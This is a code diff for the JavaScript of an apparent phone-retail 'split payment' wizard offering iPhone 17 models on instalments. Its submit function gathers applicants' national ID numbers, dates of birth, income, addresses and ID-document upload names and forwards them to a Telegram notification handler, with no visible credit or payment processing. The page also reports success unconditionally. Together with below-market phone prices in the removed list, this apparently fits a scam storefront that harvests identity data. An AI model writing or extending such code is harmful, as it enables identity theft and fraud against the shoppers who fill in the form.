@@ -1,288 +1,308 @@
-const productsForSplitPayment = [
-    {
-        id: 'iphone16promax',
-        name: 'iPhone 16 Pro Max',
-        variants: [
-            { storage: '256GB', price: 799 },
-            { storage: '512GB', price: 849 },
-            { storage: '1TB', price: 920 },
-        ],
-        colors: ['Black Titanium', 'Desert Titanium'],
-        image: 'https://m.media-amazon.com/images/I/61UMlmDXG+L.AC_SX466.jpg'
-    },
-    {
-        id: 'iphone15promax',
-        name: 'iPhone 15 Pro Max',
-        variants: [
-            { storage: '256GB', price: 699 },
-            { storage: '512GB', price: 759 }
-        ],
-        colors: ['Black Titanium'],
-        image: 'https://m.media-amazon.com/images/I/61v5Jay9F5L._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys25ultra',
-        name: 'Samsung Galaxy S25 Ultra',
-        variants: [
-            { storage: '256GB', price: 719 },
-            { storage: '512GB', price: 829 },
-            { storage: '1TB', price: 949 }
-        ],
-        colors: ['Black', 'Silver', 'Icy Blue'],
-        image: 'https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys24ultra',
-        name: 'Samsung Galaxy S24 Ultra',
-        variants: [
-            { storage: '256GB', price: 599 },
-            { storage: '512GB', price: 624 },
-            { storage: '1TB', price: 799 }
-        ],
-        colors: ['Violet', 'Black'],
-        image: 'https://m.media-amazon.com/images/I/51E3rux4DgL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'iphone16',
-        name: 'iPhone 16',
-        variants: [
-            { storage: '128GB', price: 650 },
-            { storage: '256GB', price: 725 },
-        ],
-        colors: ['Black Titanium', 'White', 'Teal'],
-        image: 'https://m.media-amazon.com/images/I/419CpsXXGQL.AC_SX466.jpg'
-    },
-    {
-        id: 'iphone16e',
-        name: 'iPhone 16 e',
-        variants: [
-            { storage: '128GB', price: 509 },
-            { storage: '256GB', price: 620 },
-        ],
-        colors: ['Black', 'White'],
-        image: 'https://m.media-amazon.com/images/I/51H8+zCj2cL._AC_SX569_.jpg'
-    },
-    {
-        id: 'iphone15',
-        name: 'iPhone 15',
-        variants: [
-            { storage: '128GB', price: 519 },
-            { storage: '256GB', price: 599 },
-        ],
-        colors: ['Black', 'Blue'],
-        image: 'https://m.media-amazon.com/images/I/51PtFHUPjBL._AC_SY606_.jpg'
-    },
-    {
-        id: 'iphone14promax',
-        name: 'iPhone 14 Pro Max',
-        variants: [
-            { storage: '256GB', price: 529 },
-            { storage: '512GB', price: 600 },
-        ],
-        colors: ['Black', 'Gold'],
-        image: 'https://m.media-amazon.com/images/I/51wqFSpP20L._AC_SL1000_.jpg'
-    },
-    {
-        id: 'iphone14',
-        name: 'iPhone 14',
-        variants: [
-            { storage: '256GB', price: 379 },
-            { storage: '512GB', price: 429 },
-        ],
-        colors: ['Black', 'Starlight'],
-        image: 'https://m.media-amazon.com/images/I/51Yz9FaNIGL._AC_SL1000_.jpg'
-    },
-    {
-        id: 'iphone13promax',
-        name: 'iPhone 13 Pro Max',
-        variants: [
-            { storage: '256GB', price: 359 },
-            { storage: '512GB', price: 549 },
-        ],
-        colors: ['Black', 'Sierra Blue'],
-        image: 'https://m.media-amazon.com/images/I/51UtM-A3fdL._AC_SX569_.jpg'
-    },
-    {
-        id: 'iphone12promax',
-        name: 'iPhone 12 Pro Max',
-        variants: [
-            { storage: '256GB', price: 249 },
-            { storage: '512GB', price: 279 },
-        ],
-        colors: ['Black Titanium'],
-        image: 'https://m.media-amazon.com/images/I/5109dvnof9L._AC_SY606_.jpg'
-    },
-    {
-        id: 'galaxyS25',
-        name: 'Samsung Galaxy S25',
-        variants: [
-            { storage: '256GB', price: 599 },
-            { storage: '512GB', price: 649 },
-        ],
-        colors: ['Silver', 'Blue'],
-        image: 'https://m.media-amazon.com/images/I/61C17Al0dhL._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys24',
-        name: 'Samsung Galaxy S24',
-        variants: [
-            { storage: '256GB', price: 449 },
-            { storage: '512GB', price: 529 },
-        ],
-        colors: ['Black', 'Gray'],
-        image: 'https://m.media-amazon.com/images/I/61uakkLoHxL._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys24plus',
-        name: 'Samsung Galaxy S24 Plus',
-        variants: [
-            { storage: '256GB', price: 559 },
-        ],
-        colors: ['Black Titanium'],
-        image: 'https://m.media-amazon.com/images/I/51bdK6FaR-L._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys23ultra',
-        name: 'Samsung Galaxy S23 Ultra',
-        variants: [
-            { storage: '256GB', price: 349 },
-            { storage: '512GB', price: 399 },
-        ],
-        colors: ['Black', 'Pink'],
-        image: 'https://m.media-amazon.com/images/I/513vXUcPFrL._AC_SX569_.jpg'
-    },
-    {
-        id: 'galaxys23',
-        name: 'Samsung Galaxy S23',
-        variants: [
-            { storage: '256GB', price: 249 },
-            { storage: '512GB', price: 279 },
-        ],
-        colors: ['Green', 'Cream'],
-        image: 'https://m.media-amazon.com/images/I/51xj0EFyXHL._AC_SX522_.jpg'
-    },
-    {
-        id: 'galaxys22ultra',
-        name: 'Samsung Galaxy S22 Ultra',
-        variants: [
-            { storage: '256GB', price: 239 },
-        ],
-        colors: ['Black Titanium'],
-        image: 'https://m.media-amazon.com/images/I/613Fp7fknhL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxya545g',
-        name: 'Samsung Galaxy A54 5G',
-        variants: [
-            { storage: '128GB', price: 349 },
-            { storage: '256GB', price: 399 },
-        ],
-        colors: ['Black', 'Peach'],
-        image: 'https://m.media-amazon.com/images/I/51orKJJMfTL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxya35',
-        name: 'Samsung Galaxy A35',
-        variants: [
-            { storage: '128GB', price: 199 },
-            { storage: '256GB', price: 229 },
-        ],
-        colors: ['Black'],
-        image: 'https://m.media-amazon.com/images/I/61R5WdNY8LL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxya155g',
-        name: 'Samsung Galaxy A15 5G',
-        variants: [
-            { storage: '64GB', price: 189 },
-            { storage: '128GB', price: 229 },
-        ],
-        colors: ['Black'],
-        image: 'https://m.media-amazon.com/images/I/41vU1u8DZXL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxym15',
-        name: 'Samsung Galaxy M15',
-        variants: [
-            { storage: '64GB', price: 169 },
-            { storage: '128GB', price: 209 },
-        ],
-        colors: ['Black'],
-        image: 'https://m.media-amazon.com/images/I/41k9aSrQRAL._SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'redmi14c',
-        name: 'Xiaomi Redmi 14C',
-        variants: [
-            { storage: '4GB + 128GB', price: 129 },
-            { storage: '6GB + 128GB', price: 179 },
-            { storage: '8GB + 256GB', price: 209 },
-        ],
-        colors: ['Midnight Black', 'Sage Green'],
-        image: 'https://m.media-amazon.com/images/I/612KZF3V+ZL._AC_SY300_SX300_.jpg'
-    },
-    {
-        id: 'redminote14pro5g',
-        name: 'Xiaomi Redmi Note 14 Pro 5G',
-        variants: [
-            { storage: '8GB + 256GB', price: 249 },
-            { storage: '12GB + 512GB', price: 319 },
-        ],
-        colors: ['Midnight Black'],
-        image: 'https://m.media-amazon.com/images/I/51AelgZWpaL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'redminote14',
-        name: 'Xiaomi Redmi Note 14',
-        variants: [
-            { storage: '6GB + 128GB', price: 207 },
-        ],
-        colors: ['Gray'],
-        image: 'https://m.media-amazon.com/images/I/81L4MbrSEBL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'redminote13pro',
-        name: 'Xiaomi Redmi Note 13 Pro',
-        variants: [
-            { storage: '8GB + 256GB', price: 223 },
-        ],
-        colors: ['Black'],
-        image: 'https://m.media-amazon.com/images/I/71ZjanVe7oL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxywatch6',
-        name: 'Samsung Galaxy Watch 6',
-        variants: [
-            { storage: 'Standard', price: 229 },
-        ],
-        colors: ['Default'],
-        image: 'https://m.media-amazon.com/images/I/81Dm65eja8L._AC_SX425_.jpg'
-    },
-    {
-        id: 'pocof6',
-        name: 'Xiaomi Poco F6',
-        variants: [
-            { storage: 'Standard', price: 329 },
-        ],
-        colors: ['Default'],
-        image: 'https://m.media-amazon.com/images/I/61O1Ey0bwxL.__AC_SX300_SY300_QL70_FMwebp_.jpg'
-    },
-    {
-        id: 'galaxys20ultra',
-        name: 'Samsung Galaxy S20 Ultra 5G',
-        variants: [
-            { storage: '512GB', price: 211 },
-        ],
-        colors: ['Cosmic Gray'],
-        image: 'https://m.media-amazon.com/images/I/51Tsn0W3XFL._AC_SX522_.jpg'
-    },
-    {
-        id: 'galaxys21ultra',
-        name: 'Samsung Galaxy S21 Ultra 5G',
-        variants: [
-            { storage: '512GB', price: 246 },
-        ],
-        colors: ['Phantom Black', 'Phantom Navy'],
-        image: 'https://m.media-amazon.com/images/I/610KvwSCMYL._AC_SX466_.jpg'
+document.addEventListener('DOMContentLoaded', () => {
+    // This script is for the wizard-style split payment page (iphone17-split-payment.html)
+
+    // Define products locally for this page
+    const productsForSplitPaymentIphone17 = [
+        {
+            id: 'iphone17',
+            name: 'iPhone 17',
+            variants: [
+                { storage: '128GB', price: 1099 },
+                { storage: '256GB', price: 1199 },
+            ],
+            colors: ['Polaris', 'Cosmic Black', 'Desert Gold'],
+            image: 'https://citymagazine.b-cdn.net/wp-content/uploads/2025/08/hero-series-iphone17-2025-0-1400x933.webp'
+        },
+        {
+            id: 'iphone17plus',
+            name: 'iPhone 17 Plus',
+            variants: [
+                { storage: '128GB', price: 1199 },
+                { storage: '256GB', price: 1299 },
+            ],
+            colors: ['Polaris', 'Cosmic Black', 'Desert Gold'],
+            image: 'https://citymagazine.b-cdn.net/wp-content/uploads/2025/08/hero-series-iphone17-2025-0-1400x933.webp'
+        },
+        {
+            id: 'iphone17pro',
+            name: 'iPhone 17 Pro',
+            variants: [
+                { storage: '256GB', price: 1399 },
+                { storage: '512GB', price: 1599 },
+                { storage: '1TB', price: 1799 },
+            ],
+            colors: ['Titanium Black', 'Natural Titanium', 'Desert Titanium'],
+            image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_large.jpg'
+        },
+        {
+            id: 'iphone17promax',
+            name: 'iPhone 17 Pro Max',
+            variants: [
+                { storage: '256GB', price: 1499 },
+                { storage: '512GB', price: 1699 },
+                { storage: '1TB', price: 1899 },
+            ],
+            colors: ['Titanium Black', 'Natural Titanium', 'Desert Titanium'],
+            image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_max_large.jpg'
+        }
+    ];
+
+    // --- STATE MANAGEMENT ---
+    let state = {
+        currentStep: 1,
+        selectedProduct: null,
+        selectedVariant: null,
+        selectedColor: null,
+        selectedPlan: { months: 6, interest: 2 }, // Default plan
+    };
+
+    // --- DOM ELEMENTS ---
+    const wizardSteps = document.querySelectorAll('.wizard-step');
+    const stepIndicators = document.querySelectorAll('.step');
+    const productGrid = document.getElementById('product-selection-grid');
+    
+    // Step 2 elements
+    const selectedProductSummary = document.getElementById('selected-product-summary');
+    const storageSelect = document.getElementById('storage-select');
+    const colorSelect = document.getElementById('color-select');
+    const monthsSelect = document.getElementById('months-select');
+    const calculationSummary = document.getElementById('calculation-summary');
+
+    // Step 3 elements
+    const customerForm = document.getElementById('customer-info-form');
+    const employmentStatusSelect = document.getElementById('employment-status');
+    const employerGroup = document.getElementById('employer-group');
+
+    // Step 4 elements
+    const termsCheckbox = document.getElementById('terms-agree-checkbox');
+    const submitBtn = document.getElementById('submit-application-btn');
+
+    // --- INITIALIZATION ---
+    function initializePage() {
+        // The main script.js handles language and currency. We just need to build the UI.
+        populateProductGrid();
+        populateMonths();
+        setupEventListeners();
+        goToStep(1); // Start at step 1
     }
-];
+
+    // --- UI POPULATION ---
+    function populateProductGrid() {
+        if (!productGrid) return;
+        productGrid.innerHTML = '';
+        productsForSplitPaymentIphone17.forEach(product => {
+            const card = document.createElement('div');
+            card.className = 'product-card';
+            card.innerHTML = `
+                <div class="product-image"><img src="${product.image}" alt="${product.name}"></div>
+                <div class="product-info">
+                    <h3 class="product-name">${product.name}</h3>
+                    <div class="product-price">
+                        <span class="current-price">${t('starting_from') || 'From'} ${convertPrice(product.variants[0].price, false)}</span>
+                    </div>
+                    <button class="btn btn-primary select-product-btn" data-product-id="${product.id}">${t('select_product') || 'Select Product'}</button>
+                </div>
+            `;
+            productGrid.appendChild(card);
+        });
+    }
+
+    function populateMonths() {
+        if (!monthsSelect) return;
+        monthsSelect.innerHTML = '';
+        const plans = [{ months: 6, interest: 2 }, { months: 12, interest: 4 }, { months: 18, interest: 5 }, { months: 24, interest: 6 }];
+        plans.forEach(plan => {
+            const option = document.createElement('option');
+            option.value = plan.months;
+            option.textContent = t('split_payment_month_interest').replace('{months}', plan.months).replace('{interest}', plan.interest) || `${plan.months} Months (+${plan.interest}%)`;
+            option.dataset.interest = plan.interest;
+            monthsSelect.appendChild(option);
+        });
+        // Set default plan in state
+        state.selectedPlan = plans[0];
+    }
+
+    // --- EVENT LISTENERS ---
+    function setupEventListeners() {
+        // Product selection
+        productGrid?.addEventListener('click', e => {
+            if (e.target.classList.contains('select-product-btn')) {
+                const productId = e.target.dataset.productId;
+                state.selectedProduct = productsForSplitPaymentIphone17.find(p => p.id === productId);
+                if (state.selectedProduct) {
+                    goToStep(2);
+                    configureProductStep();
+                }
+            }
+        });
+
+        // Wizard navigation
+        document.querySelector('.split-payment-wizard')?.addEventListener('click', e => {
+            if (e.target.closest('[data-action="next"]')) goToStep(state.currentStep + 1);
+            if (e.target.closest('[data-action="prev"]')) goToStep(state.currentStep - 1);
+        });
+
+        // Configuration dropdowns
+        storageSelect?.addEventListener('change', handleConfigurationChange);
+        colorSelect?.addEventListener('change', handleConfigurationChange);
+        monthsSelect?.addEventListener('change', handleConfigurationChange);
+
+        // Form validation
+        customerForm?.addEventListener('input', checkFormCompletion);
+        termsCheckbox?.addEventListener('change', checkFormCompletion);
+        submitBtn?.addEventListener('click', submitApplication);
+
+        employmentStatusSelect?.addEventListener('change', () => {
+            if (employmentStatusSelect.value === 'employed' || employmentStatusSelect.value === 'self-employed') {
+                employerGroup.style.display = 'block';
+                document.getElementById('employer-name').required = true;
+            } else {
+                employerGroup.style.display = 'none';
+                document.getElementById('employer-name').required = false;
+            }
+        });
+    }
+
+    // --- WIZARD LOGIC ---
+    function goToStep(step) {
+        if (step > 4) { // Handle success step
+            wizardSteps.forEach(s => s.classList.remove('active'));
+            document.getElementById('wizard-success-step').classList.add('active');
+            stepIndicators.forEach(ind => ind.classList.add('active')); // Mark all as complete
+            return;
+        }
+
+        state.currentStep = step;
+        wizardSteps.forEach(s => s.classList.remove('active'));
+        document.getElementById(`wizard-step-${step}`)?.classList.add('active');
+        stepIndicators.forEach((ind, i) => {
+            ind.classList.toggle('active', i + 1 <= step);
+            ind.classList.toggle('completed', i + 1 < step);
+        });
+        window.scrollTo(0, 0);
+    }
+
+    function configureProductStep() {
+        if (!selectedProductSummary || !storageSelect || !colorSelect) return;
+
+        selectedProductSummary.innerHTML = `<img src="${state.selectedProduct.image}" alt="${state.selectedProduct.name}"><h3>${state.selectedProduct.name}</h3>`;
+
+        storageSelect.innerHTML = `<option value="">${t('split_payment_choose_storage') || '-- Choose storage --'}</option>`;
+        state.selectedProduct.variants.forEach(v => {
+            storageSelect.innerHTML += `<option value="${v.storage}" data-price="${v.price}">${v.storage} - ${convertPrice(v.price, false)}</option>`;
+        });
+
+        colorSelect.innerHTML = `<option value="">${t('split_payment_choose_color') || '-- Choose color --'}</option>`;
+        state.selectedProduct.colors.forEach(c => {
+            colorSelect.innerHTML += `<option value="${c}">${c}</option>`;
+        });
+
+        resetConfig();
+    }
+
+    function resetConfig() {
+        storageSelect.value = '';
+        colorSelect.value = '';
+        monthsSelect.value = state.selectedPlan.months;
+        state.selectedVariant = null;
+        state.selectedColor = null;
+        calculationSummary.style.display = 'none';
+        document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
+    }
+
+    function handleConfigurationChange() {
+        const storageOption = storageSelect.options[storageSelect.selectedIndex];
+        if (storageOption && storageOption.value) {
+            state.selectedVariant = { storage: storageOption.value, price: parseFloat(storageOption.dataset.price) };
+        } else {
+            state.selectedVariant = null;
+        }
+        state.selectedColor = colorSelect.value || null;
+
+        const planOption = monthsSelect.options[monthsSelect.selectedIndex];
+        state.selectedPlan = {
+            months: parseInt(planOption.value),
+            interest: parseFloat(planOption.dataset.interest)
+        };
+        
+        if (state.selectedVariant && state.selectedColor) {
+            updateCalculations();
+            calculationSummary.style.display = 'block';
+            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = false;
+        } else {
+            calculationSummary.style.display = 'none';
+            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
+        }
+    }
+
+    function updateCalculations() {
+        if (!state.selectedVariant || !state.selectedPlan) return;
+        
+        const basePrice = state.selectedVariant.price;
+        const interestAmount = basePrice * (state.selectedPlan.interest / 100);
+        const totalPrice = basePrice + interestAmount;
+        const monthlyPayment = totalPrice / state.selectedPlan.months;
+
+        document.getElementById('summary-price').textContent = convertPrice(basePrice, false);
+        document.getElementById('summary-interest-rate').textContent = state.selectedPlan.interest;
+        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount, false);
+        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice, false);
+        document.getElementById('summary-monthly').textContent = convertPrice(monthlyPayment, false);
+    }
+
+    function checkFormCompletion() {
+        if (!customerForm) return;
+
+        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
+        const allFilled = requiredFields.every(field => field.value.trim() !== '');
+        
+        const nextBtn = document.querySelector('#wizard-step-3 [data-action="next"]');
+        if (nextBtn) nextBtn.disabled = !allFilled;
+
+        submitBtn.disabled = !allFilled || !termsCheckbox.checked;
+    }
+
+    function submitApplication() {
+        if (!state.selectedProduct || !state.selectedVariant || !state.selectedColor || !validateCustomerInfo() || !termsCheckbox.checked) {
+            alert(t('error_fill_all_fields') || "Please fill all required fields and agree to the terms.");
+            return;
+        }
+
+        const customerData = {
+            name: document.getElementById('customer-name').value,
+            dob: document.getElementById('customer-dob').value,
+            email: document.getElementById('customer-email').value,
+            phone: document.getElementById('customer-phone').value,
+            nationalId: document.getElementById('customer-national-id').value,
+            address: document.getElementById('customer-address').value,
+            employment: document.getElementById('employment-status').options[document.getElementById('employment-status').selectedIndex].text,
+            employer: document.getElementById('employer-name').value || 'N/A',
+            income: document.getElementById('monthly-income').value,
+            idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
+            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided',
+            addressProof: document.getElementById('address-proof-upload').files[0]?.name || 'Not provided'
+        };
+
+        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
+            TelegramNotifications.splitPaymentApplicationSubmitted({
+                productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
+                total: document.getElementById('summary-total-price').textContent,
+                monthly: document.getElementById('summary-monthly').textContent + " / month",
+                months: monthsSelect.value,
+                customer: customerData,
+                country: window.currentCountry.toUpperCase()
+            });
+        }
+
+        goToStep(5); // Go to success step
+    }
+
+    function validateCustomerInfo() {
+        if (!customerForm) return false;
+        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
+        return requiredFields.every(field => field.value.trim() !== '');
+    }
+
+    // --- START ---
+    initializePage();
+});
